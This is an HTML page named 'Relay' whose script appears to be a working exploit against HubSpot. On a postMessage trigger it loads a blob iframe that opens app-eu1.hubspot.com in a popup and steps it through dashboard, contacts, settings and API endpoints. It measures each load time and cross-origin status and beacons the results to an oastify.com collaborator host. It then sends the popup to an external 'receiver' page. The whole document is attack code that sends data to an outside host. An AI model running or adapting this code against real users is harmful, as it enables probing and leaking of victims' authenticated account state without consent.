<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Access Probing Attack</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function l(m) { 
    const d = document.getElementById('log');
    d.innerHTML += '<br>' + m;
    d.scrollTop = d.scrollHeight;
    new Image().src = E + '/?s=' + encodeURIComponent(m); 
}

l('START_origin=' + window.origin);

l('opening_hubspot');
let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');

if (!hub) {
    l('ERROR_blocked');
} else {
    l('popup_opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            hub.origin;
            if (attempts % 20 === 0) l('waiting_' + attempts);
        } catch(e) {
            clearInterval(checker);
            l('hubspot_loaded_after_' + attempts);
            
            // Start probing different endpoints
            let probeIndex = 0;
            const probes = [
                {name: 'dashboard', url: 'https://app-eu1.hubspot.com/dashboard/'},
                {name: 'contacts', url: 'https://app-eu1.hubspot.com/contacts/'},
                {name: 'settings', url: 'https://app-eu1.hubspot.com/settings/'},
                {name: 'reports', url: 'https://app-eu1.hubspot.com/reports-dashboard/'},
                {name: 'email', url: 'https://app-eu1.hubspot.com/email/'},
                {name: 'api_account', url: 'https://api.hubapi.com/account-info/v3/details'},
                {name: 'api_contacts', url: 'https://api.hubapi.com/contacts/v1/lists/all/contacts/all'},
                {name: 'api_settings', url: 'https://api.hubapi.com/settings/v3/users'}
            ];
            
            function probeNext() {
                if (probeIndex >= probes.length) {
                    l('ALL_PROBES_COMPLETE');
                    
                    // Final action: Navigate to our receiver to collect any final data
                    setTimeout(() => {
                        l('navigating_to_receiver');
                        hub.location = 'https://majdch22.github.io/receiver.html';
                    }, 2000);
                    return;
                }
                
                const probe = probes[probeIndex];
                probeIndex++;
                
                l('PROBE_' + probeIndex + '_' + probe.name);
                
                const startTime = Date.now();
                
                // Navigate to the probe URL
                try {
                    hub.location = probe.url;
                } catch(err) {
                    l('nav_error_' + probe.name + '=' + err.message);
                    probeNext();
                    return;
                }
                
                // Wait and measure load time
                setTimeout(() => {
                    const loadTime = Date.now() - startTime;
                    l('timing_' + probe.name + '=' + loadTime + 'ms');
                    
                    // Send timing data
                    new Image().src = E + '/?timing_' + probe.name + '=' + loadTime;
                    
                    // Try to detect if navigation succeeded
                    try {
                        // If we can still access hub.location, it might be same-origin (error page)
                        let loc = hub.location.href;
                        l('accessible_' + probe.name + '=' + loc.substring(0, 50));
                        new Image().src = E + '/?accessible_' + probe.name + '=true';
                    } catch(e) {
                        l('cross_origin_' + probe.name);
                        new Image().src = E + '/?cross_origin_' + probe.name + '=true';
                    }
                    
                    // Check if popup is still open
                    if (hub.closed) {
                        l('popup_closed_at_' + probe.name);
                        new Image().src = E + '/?popup_closed=' + probe.name;
                        return;
                    }
                    
                    // Move to next probe
                    setTimeout(probeNext, 1000);
                    
                }, 3000); // Wait 3 seconds for each probe to load
            }
            
            // Start probing after initial delay
            setTimeout(() => {
                l('STARTING_PROBES');
                probeNext();
            }, 2000);
        }
        
        if (attempts > 150) {
            clearInterval(checker);
            l('timeout');
        }
    }, 100);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
